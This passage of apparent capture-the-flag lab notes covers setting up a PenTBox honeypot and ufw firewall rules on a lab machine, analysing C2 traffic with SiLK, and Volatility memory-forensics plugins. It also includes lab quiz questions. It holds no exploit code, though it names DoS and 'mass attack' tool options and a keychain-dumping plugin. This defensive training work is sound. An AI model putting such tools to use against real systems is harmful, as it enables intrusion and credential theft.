      <myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>
      <clouds/>
      <scmCheckoutRetryCount>0</scmCheckoutRetryCount>
      <views>
        <hudson.model.AllView>
          <owner class="hudson" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
    
    ```


## [Day 13] Intrusion detection To the Pots, Through the Walls


```bash
                                                                                        
┌──(nei㉿kali)-[~]
└─$ sudo nano /etc/hosts  
[sudo] password for nei: 
                                                                                        
┌──(nei㉿kali)-[~]
└─$ ssh vantwinkle@10.10.198.123
The authenticity of host '10.10.198.123 (10.10.198.123)' can't be established.
ED25519 key fingerprint is SHA256:JS05gxNzBhM65qQJdXBoQ2BqbBG/hUEUkmigauUQuRI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.198.123' (ED25519) to the list of known hosts.
vantwinkle@10.10.198.123's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1049-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Apr  3 17:04:05 UTC 2025

  System load:  0.11              Processes:             116
  Usage of /:   6.3% of 58.09GB   Users logged in:       0
  Memory usage: 16%               IPv4 address for eth0: 10.10.198.123
  Swap usage:   0%

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
vantwinkle@ip-10-10-198-123:~$ ls         
Van_Twinkle_rules.sh  pentbox  sudo
vantwinkle@ip-10-10-198-123:~$ ls
Van_Twinkle_rules.sh  pentbox  sudo
vantwinkle@ip-10-10-198-123:~$ 
vantwinkle@ip-10-10-198-123:~$ cd pentbox
vantwinkle@ip-10-10-198-123:~/pentbox$ ls
README.md  pentbox-1.8  pentbox.tar.gz
vantwinkle@ip-10-10-198-123:~/pentbox$ cd pentbox-1.8/
vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ ls
COPYING.txt    lib    pb_update.rb  readme.txt  tools
changelog.txt  other  pentbox.rb    todo.txt
vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ sudo ./pentbox.rb

 PenTBox 1.8 
                                     .::!!!!!!!:. 
  .!!!!!:.                        .:!!!!!!!!!!!! 
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$ 
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P 
      $$$$$##WX!:      .<!!!!UW$$$$   $$$$$$$$# 
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$* 
      ^$$$B  $$$$      $$$$$$$$$$$$   d$$R* 
        **$bd$$$$      '*$$$$$$$$$$$o+#  
             ****          ******* 

--------- Menu          ruby2.7.0 @ x86_64-linux-gnu

1- Cryptography tools

2- Network tools

3- Web

4- Ip grabber

5- Geolocation ip

6- Mass attack

7- License and contact

8- Exit

   -> 2

1- Net DoS Tester
2- TCP port scanner
3- Honeypot
4- Fuzzer
5- DNS and host gathering
6- MAC address geolocation (samy.pl)

0- Back

   -> 3

// Honeypot //

You must run PenTBox with root privileges.
                                                                                  
 Select option.

1- Fast Auto Configuration
2- Manual Configuration [Advanced Users, more options]

   -> 2

 Insert port to Open.

   -> 8080

 Insert false message to show.

   -> santa has gone for the holidays

 Save a log with intrusions?

 (y/n)   -> y

 Log file name? (incremental)

Default: */pentbox/other/log_honeypot.txt

   -> 

 Activate beep() sound when intrusion?

 (y/n)   -> y

  HONEYPOT ACTIVATED ON PORT 8080 (2025-04-03 17:09:02 +0000)

TwinkleStar^[[D^[[C

  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:60330 (2025-04-03 17:09:43 +0000)
 -----------------------------
GET / HTTP/1.1
Host: 10.10.198.123:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate

  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:37614 (2025-04-03 17:09:47 +0000)
 -----------------------------
GET / HTTP/1.1
Host: 10.10.198.123:8080
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate

  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:37616 (2025-04-03 17:09:56 +0000)
 -----------------------------
GET / HTTP/1.1
Host: 10.10.198.123:8080
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate

  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:37632 (2025-04-03 17:09:57 +0000)
 -----------------------------

^C
[*] EXITING ...

vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ cd ..
vantwinkle@ip-10-10-198-123:~/pentbox$ cd ..
vantwinkle@ip-10-10-198-123:~$ sudo ufw default allow outgoing
Default outgoing policy changed to 'allow'
(be sure to update your rules accordingly)
vantwinkle@ip-10-10-198-123:~$ sudo ufw default deny incoming
Default incoming policy changed to 'deny'
(be sure to update your rules accordingly)
vantwinkle@ip-10-10-198-123:~$ sudo ufw  allow 22/tcp
Rules updated
vantwinkle@ip-10-10-198-123:~$ sudo ufw deny from sudo ufw deny from 10.23.89.97
ERROR: Improper rule syntax
vantwinkle@ip-10-10-198-123:~$ sudo ufw deny from 10.23.89.97
Rules updated                                                                     
vantwinkle@ip-10-10-198-123:~$ sudo ufw enable                                    
Command may disrupt existing ssh connections. Proceed with operation (y|n)? y     
Firewall is active and enabled on system startup                                  
vantwinkle@ip-10-10-198-123:~$ sudo ufw status verbose                            
Status: active                                                                    
Logging: on (low)                                                                 
Default: deny (incoming), allow (outgoing), disabled (routed)                     
New profiles: skip                                                                
                                                                                  
To                         Action      From                                       
--                         ------      ----                                       
22/tcp                     ALLOW IN    Anywhere                                   
Anywhere                   DENY IN     10.23.89.97                                
22/tcp (v6)                ALLOW IN    Anywhere (v6)                              
                                                                                  
vantwinkle@ip-10-10-198-123:~$ sudo ufw reset                                     
Resetting all rules to installed defaults. This may disrupt existing ssh          
connections. Proceed with operation (y|n)? y
Backing up 'user.rules' to '/etc/ufw/user.rules.20250403_171416'
Backing up 'before.rules' to '/etc/ufw/before.rules.20250403_171416'
Backing up 'after.rules' to '/etc/ufw/after.rules.20250403_171416'
Backing up 'user6.rules' to '/etc/ufw/user6.rules.20250403_171416'
Backing up 'before6.rules' to '/etc/ufw/before6.rules.20250403_171416'
Backing up 'after6.rules' to '/etc/ufw/after6.rules.20250403_171416'

vantwinkle@ip-10-10-198-123:~$ ls
Van_Twinkle_rules.sh  pentbox  sudo
vantwinkle@ip-10-10-198-123:~$ ./Van_Twinkle_rules.sh 
/bin/bash: ./Van_Twinkle_rules.sh: Permission denied
vantwinkle@ip-10-10-198-123:~$ sudo ./Van_Twinkle_rules.sh 
Backing up 'user.rules' to '/etc/ufw/user.rules.20250403_171455'
Backing up 'before.rules' to '/etc/ufw/before.rules.20250403_171455'
Backing up 'after.rules' to '/etc/ufw/after.rules.20250403_171455'
Backing up 'user6.rules' to '/etc/ufw/user6.rules.20250403_171455'
Backing up 'before6.rules' to '/etc/ufw/before6.rules.20250403_171455'
Backing up 'after6.rules' to '/etc/ufw/after6.rules.20250403_171455'

Default incoming policy changed to 'allow'
(be sure to update your rules accordingly)
Rules updated
Rules updated (v6)
Rules updated
Rules updated (v6)
Rules updated
Rules updated (v6)
Rules updated
Rules updated (v6)
Rules updated
Rules updated (v6)
Command may disrupt existing ssh connections. Proceed with operation (y|n)? y
Firewall is active and enabled on system startup
vantwinkle@ip-10-10-198-123:~$ cd pentbox/
vantwinkle@ip-10-10-198-123:~/pentbox$ cd pentbox-1.8/
vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ ls
COPYING.txt    lib    pb_update.rb  readme.txt  tools
changelog.txt  other  pentbox.rb    todo.txt
vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ ./pentbox.rb 

 PenTBox 1.8 
    ____          _____ ____
   |  _ \ ___ _ _|_   _| __ )  _____  __
   | |_) / _ \ '_ \| | |  _ \ / _ \ \/ /
   |  __/  __/ | | | | | |_) | (_) >  <
   |_|   \___|_| |_|_| |____/ \___/_/\_\

--------- Menu          ruby2.7.0 @ x86_64-linux-gnu

1- Cryptography tools

2- Network tools

3- Web

4- Ip grabber

5- Geolocation ip

6- Mass attack

7- License and contact

8- Exit

   -> 2

1- Net DoS Tester
2- TCP port scanner
3- Honeypot
4- Fuzzer
5- DNS and host gathering
6- MAC address geolocation (samy.pl)

0- Back

   -> 3

// Honeypot //

You must run PenTBox with root privileges.
                                                                                  
 Select option.

1- Fast Auto Configuration
2- Manual Configuration [Advanced Users, more options]

   -> 2

 Insert port to Open.

   -> 8080

 Insert false message to show.

   -> hi

 Save a log with intrusions?

 (y/n)   -> y

 Log file name? (incremental)

Default: */pentbox/other/log_honeypot.txt

   -> 

 Activate beep() sound when intrusion?

 (y/n)   -> y

  HONEYPOT ACTIVATED ON PORT 8080 (2025-04-03 17:15:48 +0000)

 Error: Honeypot requires root privileges.

[*] Module execution finished.

--------- Menu          ruby2.7.0 @ x86_64-linux-gnu

1- Cryptography tools

2- Network tools

3- Web

4- Ip grabber

5- Geolocation ip

6- Mass attack

7- License and contact

8- Exit

   -> ^[[A^[[B^C
[*] EXITING ...

vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ sudo ./p
pb_update.rb  pentbox.rb    
vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ sudo ./pentbox.rb 

 PenTBox 1.8 
             .__.
             (oo)____
             (__)    )--*
                ||--|| 

--------- Menu          ruby2.7.0 @ x86_64-linux-gnu

1- Cryptography tools

2- Network tools

3- Web

4- Ip grabber

5- Geolocation ip

6- Mass attack

7- License and contact

8- Exit

   -> 2

1- Net DoS Tester
2- TCP port scanner
3- Honeypot
4- Fuzzer
5- DNS and host gathering
6- MAC address geolocation (samy.pl)

0- Back

   -> 3

// Honeypot //

You must run PenTBox with root privileges.
                                                                                  
 Select option.

1- Fast Auto Configuration
2- Manual Configuration [Advanced Users, more options]

   -> 2

 Insert port to Open.

   -> 8080

 Insert false message to show.

   -> hi

 Save a log with intrusions?

 (y/n)   -> y

 Log file name? (incremental)

Default: */pentbox/other/log_honeypot.txt

   -> 

 Activate beep() sound when intrusion?

 (y/n)   -> y

  HONEYPOT ACTIVATED ON PORT 8080 (2025-04-03 17:16:44 +0000)

  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:36242 (2025-04-03 17:16:53 +0000)
 -----------------------------
GET / HTTP/1.1
Host: 10.10.198.123:8080
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate

     
  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:60476 (2025-04-03 17:18:08 +0000)
 -----------------------------
GET / HTTP/1.1
Host: 10.10.198.123:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate

  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:35704 (2025-04-03 17:18:36 +0000)  
 -----------------------------                                                    
GET / HTTP/1.1                                                                    
Host: 10.10.198.123:8080                                                          
Connection: keep-alive                                                            
Upgrade-Insecure-Requests: 1                                                      
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36                                                   
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8                                                            
Sec-GPC: 1                                                                        
Accept-Language: en-US,en;q=0.6                                                   
Accept-Encoding: gzip, deflate                                                    
                                                                                  
                                                                                  

  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:44560 (2025-04-03 17:18:40 +0000)
 -----------------------------
GET / HTTP/1.1
Host: 10.10.198.123:8080
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate

  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:44566 (2025-04-03 17:18:41 +0000)
 -----------------------------
GET / HTTP/1.1
Host: 10.10.198.123:8080
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate

^C      
[*] EXITING ...

vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ sudo ./pentbox.rb 

 PenTBox 1.8 
                                     .::!!!!!!!:. 
  .!!!!!:.                        .:!!!!!!!!!!!! 
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$ 
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P 
      $$$$$##WX!:      .<!!!!UW$$$$   $$$$$$$$# 
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$* 
      ^$$$B  $$$$      $$$$$$$$$$$$   d$$R* 
        **$bd$$$$      '*$$$$$$$$$$$o+#  
             ****          ******* 

--------- Menu          ruby2.7.0 @ x86_64-linux-gnu

1- Cryptography tools

2- Network tools

3- Web

4- Ip grabber

5- Geolocation ip

6- Mass attack

7- License and contact

8- Exit

   -> 2

1- Net DoS Tester
2- TCP port scanner
3- Honeypot
4- Fuzzer
5- DNS and host gathering
6- MAC address geolocation (samy.pl)

0- Back

   -> 3

// Honeypot //

You must run PenTBox with root privileges.
                                                                                  
 Select option.

1- Fast Auto Configuration
2- Manual Configuration [Advanced Users, more options]

   -> 2

 Insert port to Open.

   -> 8080

 Insert false message to show.

   -> hi

 Save a log with intrusions?

 (y/n)   -> y

 Log file name? (incremental)

Default: */pentbox/other/log_honeypot.txt

   -> 

 Activate beep() sound when intrusion?

 (y/n)   -> n

  HONEYPOT ACTIVATED ON PORT 8080 (2025-04-03 17:20:35 +0000)

^C
[*] EXITING ...

vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ ls
COPYING.txt    lib    pb_update.rb  readme.txt  tools
changelog.txt  other  pentbox.rb    todo.txt
vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ sudo ./pentbox.rb 

 PenTBox 1.8 
    ____          _____ ____
   |  _ \ ___ _ _|_   _| __ )  _____  __
   | |_) / _ \ '_ \| | |  _ \ / _ \ \/ /
   |  __/  __/ | | | | | |_) | (_) >  <
   |_|   \___|_| |_|_| |____/ \___/_/\_\

--------- Menu          ruby2.7.0 @ x86_64-linux-gnu

1- Cryptography tools

2- Network tools

3- Web

4- Ip grabber

5- Geolocation ip

6- Mass attack

7- License and contact

8- Exit

   -> 2

1- Net DoS Tester
2- TCP port scanner
3- Honeypot
4- Fuzzer
5- DNS and host gathering
6- MAC address geolocation (samy.pl)

0- Back

   -> 3

// Honeypot //

You must run PenTBox with root privileges.
                                                                                  
 Select option.

1- Fast Auto Configuration
2- Manual Configuration [Advanced Users, more options]

   -> 2

 Insert port to Open.

   -> 8080

 Insert false message to show.

   -> hi

 Save a log with intrusions?

 (y/n)   -> y

 Log file name? (incremental)

Default: */pentbox/other/log_honeypot.txt

   -> 10.10.198.123:8080

 Activate beep() sound when intrusion?

 (y/n)   -> y

  HONEYPOT ACTIVATED ON PORT 8080 (2025-04-03 17:21:25 +0000)

  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:51298 (2025-04-03 17:21:36 +0000)
 -----------------------------
GET / HTTP/1.1
Host: 10.10.198.123:8080
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate

  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:32774 (2025-04-03 17:21:46 +0000)
 -----------------------------
GET / HTTP/1.1
Host: 10.10.198.123:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate

  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:32780 (2025-04-03 17:21:47 +0000)
 -----------------------------
GET / HTTP/1.1
Host: 10.10.198.123:8080
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate

  INTRUSION ATTEMPT DETECTED! from 10.23.89.97:54838 (2025-04-03 17:21:58 +0000)
 -----------------------------
GET / HTTP/1.1
Host: 10.10.198.123:8080
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate

^C
[*] EXITING ...

vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ ^C
vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ sudo ufw stop
ERROR: Invalid syntax

Usage: ufw COMMAND

Commands:
 enable                          enables the firewall
 disable                         disables the firewall
 default ARG                     set default policy
 logging LEVEL                   set logging to LEVEL
 allow ARGS                      add allow rule
 deny ARGS                       add deny rule
 reject ARGS                     add reject rule
 limit ARGS                      add limit rule
 delete RULE|NUM                 delete RULE
 insert NUM RULE                 insert RULE at NUM
 route RULE                      add route RULE
 route delete RULE|NUM           delete route RULE
 route insert NUM RULE           insert route RULE at NUM
 reload                          reload firewall
 reset                           reset firewall
 status                          show firewall status
 status numbered                 show firewall status as numbered list of RULES
 status verbose                  show verbose firewall status
 show ARG                        show firewall report
 version                         display version information

Application profile commands:
 app list                        list application profiles
 app info PROFILE                show information on PROFILE
 app update PROFILE              update PROFILE
 app default ARG                 set default application policy

vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ sudo ufw disable
Firewall stopped and disabled on system startup
vantwinkle@ip-10-10-198-123:~/pentbox/pentbox-1.8$ cd ..
vantwinkle@ip-10-10-198-123:~/pentbox$ cd ..
vantwinkle@ip-10-10-198-123:~$ ls
Van_Twinkle_rules.sh  pentbox  sudo
vantwinkle@ip-10-10-198-123:~$ sudo ufw status verbose
Status: inactive
vantwinkle@ip-10-10-198-123:~$ ./Van_Twinkle_rules.sh 
/bin/bash: ./Van_Twinkle_rules.sh: Permission denied
vantwinkle@ip-10-10-198-123:~$ sudo ./Van_Twinkle_rules.sh 
Backing up 'user.rules' to '/etc/ufw/user.rules.20250403_173332'
Backing up 'before.rules' to '/etc/ufw/before.rules.20250403_173332'
Backing up 'after.rules' to '/etc/ufw/after.rules.20250403_173332'
Backing up 'user6.rules' to '/etc/ufw/user6.rules.20250403_173332'
Backing up 'before6.rules' to '/etc/ufw/before6.rules.20250403_173332'
Backing up 'after6.rules' to '/etc/ufw/after6.rules.20250403_173332'

Default incoming policy changed to 'allow'
(be sure to update your rules accordingly)
Rules updated
Rules updated (v6)
Rules updated
Rules updated (v6)
Rules updated
Rules updated (v6)
Rules updated
Rules updated (v6)
Rules updated
Rules updated (v6)
Command may disrupt existing ssh connections. Proceed with operation (y|n)? y
Firewall is active and enabled on system startup
vantwinkle@ip-10-10-198-123:~$ sudo ufw status verbose
Status: active
Logging: on (low)
Default: allow (incoming), allow (outgoing), disabled (routed)
New profiles: skip

To                         Action      From
--                         ------      ----
80/tcp                     ALLOW IN    Anywhere                  
22/tcp                     ALLOW IN    Anywhere                  
21/tcp                     DENY IN     Anywhere                  
8088                       DENY IN     Anywhere                  
8090/tcp                   DENY IN     Anywhere                  
80/tcp (v6)                ALLOW IN    Anywhere (v6)             
22/tcp (v6)                ALLOW IN    Anywhere (v6)             
21/tcp (v6)                DENY IN     Anywhere (v6)             
8088 (v6)                  DENY IN     Anywhere (v6)             
8090/tcp (v6)              DENY IN     Anywhere (v6)             

vantwinkle@ip-10-10-198-123:~$ ufw allow 8090/tcp
ERROR: You need to be root to run this script
vantwinkle@ip-10-10-198-123:~$ sudo ufw allow 8090/tcp
Rule updated
Rule updated (v6)
vantwinkle@ip-10-10-198-123:~$ sudo ufw status verbose
Status: active
Logging: on (low)
Default: allow (incoming), allow (outgoing), disabled (routed)
New profiles: skip

To                         Action      From
--                         ------      ----
80/tcp                     ALLOW IN    Anywhere                  
22/tcp                     ALLOW IN    Anywhere                  
21/tcp                     DENY IN     Anywhere                  
8088                       DENY IN     Anywhere                  
8090/tcp                   ALLOW IN    Anywhere                  
80/tcp (v6)                ALLOW IN    Anywhere (v6)             
22/tcp (v6)                ALLOW IN    Anywhere (v6)             
21/tcp (v6)                DENY IN     Anywhere (v6)             
8088 (v6)                  DENY IN     Anywhere (v6)             
8090/tcp (v6)              ALLOW IN    Anywhere (v6)             

vantwinkle@ip-10-10-198-123:~$ Connection to 10.10.198.123 closed by remote host.
Connection to 10.10.198.123 closed.
                      
```

## [Day 14] Machine learning The Little Machine That Wanted to Learn

Answer the questions below

What is the other term given for Artificial Intelligence or the subset of AI meant to teach computers how humans think or nature works?

Correct Answer

What ML structure aims to mimic the process of natural selection and evolution?

Correct Answer

What is the name of the learning style that makes use of labelled data to train an ML structure?

Correct Answer

What is the name of the layer between the Input and Output layers of a Neural Network?

Correct Answer

What is the name of the process used to provide feedback to the Neural Network on how close its prediction was?

Correct Answer

What is the value of the flag you received after achieving more than 90% accuracy on your submitted predictions?

Correct Answer



![Screenshot From 2025-04-03 23-51-02.png](img1401.png)


## [Day 17] Traffic analysis I Tawt I Taw A C2 Tat!

### Challenge

- Commands
    - **`cd Desktop`** → Changes directory to **Desktop**.
    - **`ll`** → Lists files in the current directory.
    - **`silk_config -v`** → Displays **SiLK configuration details**.
    - **`rwfileinfo suspicious-flows.silk`** → Shows **metadata** about `suspicious-flows.silk`.
    - **`rwcut suspicious-flows.silk --num-recs=5`** → Displays **first 5 records** from `suspicious-flows.silk`.
    - **`rwfilter suspicious-flows.silk --proto=17 --pass=stdout | rwcut --fields=protocol,sIP,sPort,dIP,dPort --num-recs=5`**
    → Filters **UDP traffic**, extracts specific fields, and **displays 5 records**.
    - **`rwstats suspicious-flows.silk --fields=dPort --values=records,packets,bytes,sIP-Distinct,dIP-Distinct --count=10`**
    → Lists **top 10 destination ports** with **traffic statistics**.
    - **`rwstats suspicious-flows.silk --fields=sIP --values=bytes --count=10 --top`**
    → Displays **top 10 source IPs** based on **bytes sent**.
    - **`rwstats suspicious-flows.silk --fields=sIP,dIP --values=records,bytes,packets --count=10`**
    → Shows **top 10 source-destination pairs** by **records, bytes, and packets**.
    - **`rwfilter suspicious-flows.silk --aport=53 --pass=stdout | rwstats --fields=sIP,dIP --values=records,bytes,packets --count=10`**
    → Filters **DNS traffic (port 53)** and displays **top 10 IP pairs** by **records, bytes, and packets**.
    - **`rwfilter suspicious-flows.silk --saddress=175.175.173.221 --dport=53 --pass=stdout | rwcut --fields=sIP,dIP,stime | head -10`**
    → Finds **DNS traffic from source 175.175.173.221**, extracts **source, destination, and timestamp**, and **shows 10 records**.
    - **`rwfilter suspicious-flows.silk --saddress=175.219.238.243 --dport=53 --pass=stdout | rwcut --fields=sIP,dIP,stime | head -10`**
    → Similar to the previous command but for **source IP 175.219.238.243**.
    - **`rwfilter suspicious-flows.silk --any-address=175.175.173.221 --pass=stdout | rwstats --fields=sIP,dIP --count=10`**
    → Filters flows **involving 175.175.173.221** and lists **top 10 source-destination pairs**.
    - **`rwfilter suspicious-flows.silk --any-address=205.213.108.99 --pass=stdout | rwstats --fields=sIP,sPort,dIP,dPort,proto --count=10`**
    → Finds **traffic involving 205.213.108.99**, showing **source, destination, ports, and protocol**.
    - **`rwfilter suspicious-flows.silk --aport=80 --pass=stdout | rwstats --fields=sIP,dIP --count=10`**
    → Filters **HTTP traffic (port 80)** and shows **top 10 source-destination pairs**.
    - **`rwfilter suspicious-flows.silk --aport=80 --pass=stdout | rwstats --fields=sIP,dIP,dPort --count=10`**
    → Same as above but includes **destination ports** in the output.
    - **`rwfilter suspicious-flows.silk --saddress=175.215.236.223 --pass=stdout | rwcut --fields=sIP,dIP,dPort,flag,stime | head`**
    → Filters **traffic from 175.215.236.223**, extracts **IP, ports, flags, and timestamps**, and **displays 10 records**.
    - **`rwfilter suspicious-flows.silk --saddress=175.215.236.223 --pass=stdout | rwstats --fields=sIP,flag,dIP --count=10`**
    → Analyzes **traffic from 175.215.236.223**, showing **source, flags, and destination stats**.
    - **`rwfilter suspicious-flows.silk --saddress=175.215.235.223 --pass=stdout | rwstats --fields=sIP,flag,dIP --count=10`**
    → Similar to the previous command but for **175.215.235.223**.
    - **`rwfilter suspicious-flows.silk --any-address=175.215.236.223 --pass=stdout | rwstats --fields=sIP,dIP --count=10`**
    → Filters traffic where **175.215.236.223** appears and shows **top 10 source-destination pairs**.
- Results
    
## [Day 19] Memory forensics CrypTOYminers Sing Volala-lala-latility


```bash
mac_kevents                - Show parent/child relationship of processes
mac_keychaindump           - Recovers possbile keychain keys. Use chainbreaker to open related keychain files
mac_ldrmodules             - Compares the output of proc maps with the list of libraries from libdl
mac_librarydump            - Dumps the executable of a process
mac_list_files             - Lists files in the file cache
mac_list_kauth_listeners   - Lists Kauth Scope listeners
mac_list_kauth_scopes      - Lists Kauth Scopes and their status
mac_list_raw               - List applications with promiscuous sockets
mac_list_sessions          - Enumerates sessions
mac_list_zones             - Prints active zones
mac_lsmod                  - Lists loaded kernel modules
mac_lsmod_iokit            - Lists loaded kernel modules through IOkit
mac_lsmod_kext_map         - Lists loaded kernel modules
mac_lsof                   - Lists per-process opened files
mac_machine_info           - Prints machine information about the sample
mac_malfind                - Looks for suspicious process mappings
mac_memdump                - Dump addressable memory pages to a file
mac_moddump                - Writes the specified kernel extension to disk
mac_mount                  - Prints mounted device information
mac_netstat                - Lists active per-process network connections
mac_network_conns          - Lists network connections from kernel network structures
mac_notesapp               - Finds contents of Notes messages
mac_notifiers              - Detects rootkits that add hooks into I/O Kit (e.g. LogKext)
mac_orphan_threads         - Lists threads that don't map back to known modules/processes
mac_pgrp_hash_table        - Walks the process group hash table
mac_pid_hash_table         - Walks the pid hash table
mac_print_boot_cmdline     - Prints kernel boot arguments
mac_proc_maps              - Gets memory maps of processes
mac_procdump               - Dumps the executable of a process
mac_psaux                  - Prints processes with arguments in user land (**argv)
mac_psenv                  - Prints processes with environment in user land (**envp)
mac_pslist                 - List Running Processes
mac_pstree                 - Show parent/child relationship of processes
mac_psxview                - Find hidden processes with various process listings
mac_recover_filesystem     - Recover the cached filesystem
mac_route                  - Prints the routing table
mac_socket_filters         - Reports socket filters
mac_strings                - Match physical offsets to virtual addresses (may take a while, VERY verbose)
